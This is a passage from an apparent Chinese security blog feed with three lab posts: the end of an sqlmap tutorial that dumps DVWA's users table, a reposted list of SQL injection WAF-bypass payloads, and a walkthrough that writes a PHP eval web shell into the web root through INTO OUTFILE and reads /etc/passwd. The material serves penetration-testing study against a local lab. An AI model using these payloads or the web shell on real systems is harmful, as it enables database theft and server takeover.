<h3 id="3-查看表格">3、查看表格</h3>
<p>可以看到很多的数据库，接下里我们就需要选择一个来进行深层次的查看</p>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; --tables
</code></pre>
<p>-D：指定数据库</p>
<p>--tables：查看表格信息</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192200.png" alt="QQ截图20210418192200" loading="lazy"></figure>
<p>显然，在dvwa数据库下有guestbook和user两张表格，接下来我们来查看表格的具体内容</p>
<h3 id="4-查看表格的字段信息">4、查看表格的字段信息</h3>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users --columns
</code></pre>
<p>-T：指定表格</p>
<p>--columns：查看字段信息</p>
<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192429.png" alt="QQ截图20210418192429" loading="lazy"></figure>
<p>刚刚看到的就是users这张表中的数据信息，接下来看下具体的数据</p>
<h3 id="5-查看具体数据">5、查看具体数据</h3>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users --dump
</code></pre>
<p>--dump：导出数据</p>
<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192718.png" alt="QQ截图20210418192718" loading="lazy"></figure>
<h3 id="6-查看某些字段">6、查看某些字段</h3>
<p>如果我们还想指定某些字段，可以使用-C参数</p>
<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users -C user_id,user,password --dump
</code></pre>
<h2 id="参数小结">参数小结</h2>
<p>--users：列出所有管理用户。</p>
<p>--dbs：获取所有数据库</p>
<p>-D：指定数据库</p>
<p>--tables：获取所有表</p>
<p>-T：指定表</p>
<p>--columns：获取所有字段</p>
<p>-C：指定字段</p>
<p>--dump：获取表中所有数据</p>
<p>--cookie：指定cookie信息</p>
<p>-m：通过url列表文件依次扫描站点</p>
<pre><code>sqlmap -m example.txt
</code></pre>
<p>示例文件，example.txt</p>
<pre><code>http://test.dvwa.com/vulnerabilities/sqli/?id=1&amp;Submit=Submit#
http://test.dvwa.com/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#
</code></pre>
<p>-r：通过http请求文件进行扫描</p>
<pre><code>sqlmap -r lalala.txt
</code></pre>
<p>示例文件，lalala.txt</p>
<pre><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Connection: keep-alive
Cookie: security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795
Host: 127.0.0.1
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0
</code></pre>
<p>--random-agent：随机user-agent</p>
<p>--proxy：指定代理</p>
<p>--threads：指定http(s)最大请求数 (默认 1)</p>
<p>-v：查看sqlmap的运行信息，一般使用3即可，具体如下</p>
<blockquote>
<p>共有七个等级，默认为1：</p>
<p>0、只显示python错误以及严重的信息。</p>
<p>1、同时显示基本信息和警告信息。（默认）</p>
<p>2、同时显示debug信息。</p>
<p>3、同时显示注入的payload。</p>
<p>4、同时显示HTTP请求。</p>
<p>5、同时显示HTTP响应头。</p>
<p>6、同时显示HTTP响应页面。</p>
</blockquote>
<p>-g：从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</p>
<pre><code>python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;
</code></pre>
<p>谷歌搜索技巧</p>
<p>1、“xxx”<br>
解释：搜素结果必须包含xxx关键字</p>
<p>2、雪*白<br>
解释：这里的*就是一个占位符，保证前面是雪，后面是白</p>
<p>3、xxx inurl: baidu<br>
解释：就是说xxx必须出现在网址的url中</p>
<p>4、xxx insite:某网站域名<br>
解释：指定某个网站中，搜索相关结果</p>
<p>5、xxx &amp;gl=us,cn<br>
解释：指定xxx结果的国家来源，us美国，cn中国</p>
<p>-f：执行广泛的DBMS版本指纹检查</p>
<p>--data：将数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p>
<p>例子：</p>
<pre><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f
</code></pre>
<p>--is-dba：判断当前的用户是否为管理，是的话会返回True。</p>
<p>--batch：用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p>
<p>--crawl：sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p>
<p>--eta：可以计算注入数据的剩余时间。</p>
<p>参考文章：</p>
<p>https://www.cnblogs.com/hongfei/p/3872156.html</p>
<p>https://www.cnblogs.com/dagger9527/tag/Sqlmap/</p>
<p>https://www.freebuf.com/sectool/164608.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sql注入绕过姿势总结（转载）]]></title>
        <id>https://Morn-zh.github.io/post/sql-zhu-ru-rao-guo-zi-shi-zong-jie-zhuan-zai/</id>
        <link href="https://Morn-zh.github.io/post/sql-zhu-ru-rao-guo-zi-shi-zong-jie-zhuan-zai/">
        </link>
        <updated>2021-04-17T09:38:36.000Z</updated>
        <content type="html"><![CDATA[<h1 id="sql注入绕过姿势总结转载">sql注入绕过姿势总结（转载）</h1>
<p>作者：<a href="https://www.cnblogs.com/joker-vip/">joker0xxx3</a></p>
<p>出处：https://www.cnblogs.com/joker-vip/</p>
<h2 id="1注释符绕过">1.注释符绕过</h2>
<p>常用的注释符有：</p>
<p>1）-- 注释内容</p>
<p>2）# 注释内容</p>
<p>3）/<em>注释内容</em>/</p>
<p>eg：union select 1,2#</p>
<p>union select 1,2 --+</p>
<p>构造闭合 ’ union select 1,2’</p>
<hr>
<h2 id="2大小写绕过">2.大小写绕过</h2>
<p>常用于 waf的正则对大小写不敏感的情况。</p>
<p>eg：uniOn selEct 1,2</p>
<hr>
<h2 id="3内联注释绕过">3.内联注释绕过</h2>
<p>内联注释就是把一些特有的仅在MYSQL上的语句放在 /<em>!...</em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。别和注释/*... */搞混了。</p>
<p>eg：union /<em>!select</em>/ 1,2</p>
<hr>
<h2 id="4双写关键字绕过">4.双写关键字绕过</h2>
<p>一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。</p>
<p>eg：union seselectlect 1,2</p>
<hr>
<h2 id="5特殊编码绕过">5.特殊编码绕过</h2>
<p>1）十六进制绕过</p>
<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</p>
<p>2）ascii编码绕过</p>
<p>eg：Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
<p>3）Unicode编码</p>
<p>常用的几个符号的一些Unicode编码：</p>
<p>单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p>
<p>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p>
<p>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p>
<p>右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p>
<hr>
<h2 id="6空格过滤绕过">6.空格过滤绕过</h2>
<p>可代替空格的方式：</p>
<p>1）/**/</p>
<p>2）()</p>
<p>3）回车(url编码中的%0a)</p>
<p>4）`(tap键上面的按钮)</p>
<p>5）tap</p>
<p>6）两个空格</p>
<p>eg：union/<strong>/select/</strong>/1,2</p>
<p>select(passwd)from(users)  #注意括号中不能含有*</p>
<p>select<code>passwd</code>from<code>users</code></p>
<hr>
<h2 id="7过滤or-and-xor异或not-绕过">7.过滤or and xor(异或)not 绕过</h2>
<p>and = &amp;&amp;</p>
<p>or = ||</p>
<p>xor = |</p>
<p>not = !</p>
<hr>
<h2 id="8过滤等号绕过">8.过滤等号=绕过</h2>
<p>1）不加通配符的like执行的效果和=一致，所以可以用来绕过。</p>
<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name like &quot;users&quot;</p>
<p>2）rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来，用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样</p>
<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name rlike &quot;users&quot;</p>
<p>3）regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</p>
<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name regexp &quot;users&quot;</p>
<p>4）使用大小于号来绕过</p>
<p>eg：select * from users where id &gt; 1 and id &lt; 3</p>
<p>5）&lt;&gt; 等价于 !=，所以在前面再加一个!结果就是等号了</p>
<p>eg：select * from users where !(id &lt;&gt; 1)</p>
<hr>
<h2 id="9过滤大小于号绕过">9.过滤大小于号绕过</h2>
<p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。</p>
<p>1）greatest(n1, n2, n3…):返回n中的最大值</p>
<p>eg：select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116</p>
<p>2）least(n1,n2,n3…):返回n中的最小值，与上同理。</p>
<p>3）strcmp(str1,str2):若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</p>
<p>eg：select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117)</p>
<p>4）in关键字</p>
<p>eg：select * from users where id = 1 and substr(username,1,1) in ('t')</p>
<p>5）between a and b:范围在a-b之间，包括a、b。</p>
<p>eg：select * from users where id between 1 and 2</p>
<p>select * from users where id between 1 and 1</p>
<hr>
<h2 id="10过滤引号绕过">10.过滤引号绕过</h2>
<p>1）使用十六进制</p>
<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</p>
<p>2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。%27表示 '(单引号)，单引号会被转义成'</p>
<p>eg：%E6' union select 1,2 #</p>
<p>%df%27 union select 1,2,3 #</p>
<hr>
<h2 id="11过滤逗号绕过">11.过滤逗号绕过</h2>
<p>1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串<br>
eg：常规写法 select substr(&quot;string&quot;,1,3)</p>
<p>若过滤了逗号，可以使用from pos for len来取代 select substr(&quot;string&quot; from 1 for 3)</p>
<p>sql盲注中 select ascii(substr(database() from 1 for 1)) &gt; 110</p>
<p>2）也可使用join关键字来绕过</p>
<p>eg：select * from users union select * from (select 1)a join (select 2)b join(select 3)c</p>
<p>上式等价于 union select 1,2,3</p>
<p>3）使用like关键字，适用于substr()等提取子串的函数中的逗号</p>
<p>eg：select user() like &quot;t%&quot;</p>
<p>上式等价于 select ascii(substr(user(),1,1))=114</p>
<p>5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit 2,1等价于limit 1 offset 2</p>
<p>eg：select * from users limit 1 offset 2</p>
<p>上式等价于 select * from users limit 2,1</p>
<hr>
<h2 id="12过滤函数绕过">12.过滤函数绕过</h2>
<p>1）sleep() --&gt;benchmark()</p>
<p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</p>
<p>eg：select 1,2 and benchmark(1000000000,1)</p>
<p>2）ascii()–&gt;hex()、bin()，替代之后再使用对应的进制转string即可</p>
<p>3）group_concat()–&gt;concat_ws()，第一个参数为分隔符</p>
<p>eg：mysql&gt; select concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;)</p>
<p>4）substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</p>
<p>5）user() --&gt; @@user、datadir–&gt;@@datadir</p>
<p>6）ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</p>
<hr>
<h2 id="13缓冲区溢出">13.缓冲区溢出</h2>
<p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
<p>eg：?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</p>
<p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
<hr>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MySQL手注之Root权限处理]]></title>
        <id>https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-root-quan-xian-chu-li/</id>
        <link href="https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-root-quan-xian-chu-li/">
        </link>
        <updated>2021-04-16T13:54:30.000Z</updated>
        <content type="html"><![CDATA[<h1 id="mysql手注之root权限处理">MySQL手注之Root权限处理</h1>
<p>学前疑问：</p>
<ul>
<li>注入的目的是啥？
<ul>
<li>得到数据库中的数据？</li>
<li>得到目标的控制权限？</li>
</ul>
</li>
</ul>
<h2 id="原理">原理</h2>
<p>利用写入函数写入一句话木马、后续shell连接的代码等（大概~</p>
<h2 id="提权条件">提权条件</h2>
<ul>
<li>
<p>当前操作数据库的用户为root权限（不一定需要root权限，但一定要有<strong>文件写入的权限</strong>，不然会白忙活</p>
</li>
<li>
<p>能够得到到物理地址（报错、phpinfo页⾯、猜、爆破），后续的写入地址需要用到</p>
</li>
<li>
<p>能够判断数据库的版本，从而决使用什么注入函数</p>
<ul>
<li>
<p>5.5.53前，my.ini中<strong>secure_file_priv</strong> 变量默认为空，所以默认情况下是<strong>可以直接通过SQL语句来导出</strong>⽂件的。</p>
</li>
<li>
<p>5.5后，mysql推出secure_file_priv变量，用于控制文件的写入导出</p>
<ul>
<li>当 secure_file_priv 的值为null ，表⽰限制mysqld 不允许导⼊|导出</li>
<li>当 secure_file_priv 的值为/tmp/ ，表⽰限制mysqld 的导⼊|导出只能发⽣在/tmp/⽬录下</li>
<li>当secure_file_priv设置为空 ，即 '' ，表⽰不对mysqld 的导⼊|导出做限制。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="常用到的函数">常用到的函数</h2>
<h3 id="load_file">load_file()</h3>
<p>读取文件</p>
<pre><code>select load_file('/etc/passwd'); 

select load_file(0x2F6574632F706173737764);
</code></pre>
<h3 id="outfile和dumpfile">outfile()和dumpfile()</h3>
<p>写入文件</p>
<h4 id="into-outfile">into outfile()</h4>
<p>into outfile()写入时会在每行结束时<strong>⾃动加上换⾏符</strong></p>
<pre><code>select '&lt;?php @eval($_POST[pass])?&gt;' into outfile '/var/www/html/muma.php' ;
</code></pre>
<h4 id="into-dumpfile">into dumpfile()</h4>
<p>into dumpfile()函数写入<strong>原⽣内容</strong>，常用于写入<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/996661?fr=aladdin">⼆进制⽂件</a></p>
<pre><code>select '&lt;?php @eval($_POST[pass])?&gt;' into DUMPFILE '/var/www/html/muma.php' ;
</code></pre>
<p>以下仅限配合dumpfile()使用（未验证）</p>
<pre><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; lines starting by 'xxxx' 
</code></pre>
<ul>
<li>
<p>lines starting by '写⼊的内容' 设置<strong>每⾏数据开头</strong>的字符，可以为单个或多个字符，默认情况下不使⽤任何字符</p>
</li>
<li>
<p>lines terminated by '写⼊的内容' 设置<strong>每⾏数据结尾</strong>的字符，可以为单个或多个字符，默认值是&quot;\n&quot;。</p>
</li>
</ul>
<p>所以说into outfile()就是into dumpfile()的简约版本？嘿嘿~</p>
<h2 id="实践">实践</h2>
<p>目标：dvwa</p>
<p>难度：low</p>
<h3 id="查看数据库版本">查看数据库版本</h3>
<pre><code>select @@version;
</code></pre>
<pre><code>5.7.26
</code></pre>
<h3 id="查看secure_file_priv">查看secure_file_priv</h3>
<p>可以知道当前数据库版本是在5.5.53后的，存在secure_file_priv，查看当前设置</p>
<pre><code>show global variables like '%secure%';
</code></pre>
<pre><code>Variable_name				Value
require_secure_transport	OFF
secure_auth					ON
secure_file_priv			NULL
</code></pre>
<p>当前为NULL，即不可以随意导出写入</p>
<h3 id="写入payload">写入payload</h3>
<p>写入payload试试</p>
<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\phpstudy_64\phpstudy_pro\www\DVWA\muma.php'#
</code></pre>
<p>提示</p>
<pre><code>File 'C:phpStudy_64phpstudy_proWWWDVWAmuma.php' already exists
</code></pre>
<p>windows下需要加转义符号</p>
<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
</code></pre>
<p>实际运行的代码为</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\phpstudy_64\phpstudy_pro\www\DVWA\muma.php'# ';
</code></pre>
<pre><code>Access denied for user 'dvwa'@'localhost' (using password: YES)
</code></pre>
<p>被拒绝了，难道是secure_file_priv设置为NULL的原因吗？</p>
<p>将my.ini文件中设置secure_file_priv为空试试</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170602.png" alt="QQ截图20210417170602" loading="lazy"></figure>
<pre><code>show global variables like '%secure%';
</code></pre>
<pre><code>Variable_name				Value
require_secure_transport	OFF
secure_auth					ON
secure_file_priv			
</code></pre>
<p>重新载入payload</p>
<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
</code></pre>
<pre><code>Access denied for user 'dvwa'@'localhost' (using password: YES)
</code></pre>
<p>好家伙，继续被拒绝</p>
<p>查阅资料后发现，当前根本没有写入权限……</p>
<p>查看权限的命令</p>
<pre><code>select * from mysql.user where user='dvwa';
</code></pre>
<p>发现根本没有文件读写的权限</p>
<p>所以说，一定要在写入前注意当前用户<strong>是否具有写入权限</strong></p>
<p>解决方法</p>
<p>将当前用户切换为root用户或者赋予当前用户相应的权限</p>
<p>继续执行刚刚的payload</p>
<pre><code>1' union select 1,&quot;&lt;?php evel($_POST[pass]);?&gt;&quot; into outfile 'C:\\phpstudy_64\\phpstudy_pro\\www\\DVWA\\muma.php'#
</code></pre>
<p>页面出现了报警信息</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165647.png" alt="QQ截图20210417165647" loading="lazy"></figure>
<p>问题不大，查看文件，发现已经写入到本地了</p>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165756.png" alt="QQ截图20210417165756" loading="lazy"></figure>
<p>文件内容如下</p>
<figure data-type="image" tabindex="4"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165818.png" alt="QQ截图20210417165818" loading="lazy"></figure>
<h3 id="使用蚁剑连接">使用蚁剑连接</h3>
<figure data-type="image" tabindex="5"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417165939.png" alt="QQ截图20210417165939" loading="lazy"></figure>
<p>发现返回数据为空，大概是写入的东西不太对，换个paylad</p>
<pre><code>1' into outfile 'C:\\phpStudy_64\\phpstudy_pro\\WWW\\DVWA\\muma.php' lines starting by '&lt;?php @eval($_POST[pass])?&gt;'#
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170121-1618651389179.png" alt="QQ截图20210417170121" loading="lazy"></figure>
<p>重新连接</p>
<figure data-type="image" tabindex="7"><img src="https://Morn-zh.github.io/post-images/MySQL%E6%89%8B%E6%B3%A8%E4%B9%8BRoot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86/QQ%E6%88%AA%E5%9B%BE20210417170133.png" alt="QQ截图20210417170133" loading="lazy"></figure>
<p>成功</p>
<h2 id="总结">总结</h2>
<ul>
<li>
<p>在进行写入文件前一定要确认当前用户是否拥有写入文件权限</p>
</li>
<li>
<p>确认当前secure_file_priv为空或者为某一确定的路径</p>
</li>
<li>
<p>注入的内容用<strong>双引号</strong>括起来</p>
</li>
<li>
<p>注入的内容需要以<?php evel($_POST[pass]);?>等连接代码开头</p>
</li>
</ul>
<h2 id="附录">附录</h2>
<h3 id="magic_quote_gpc">magic_quote_gpc</h3>
<p>魔术引号~会对输入的特殊符号进行转义</p>
<p>参考资料</p>
<p>https://blog.csdn.net/niexinming/article/details/49109683</p>
<p>https://www.jb51.net/article/29462.htm</p>
]]></content>
    </entry>
</feed>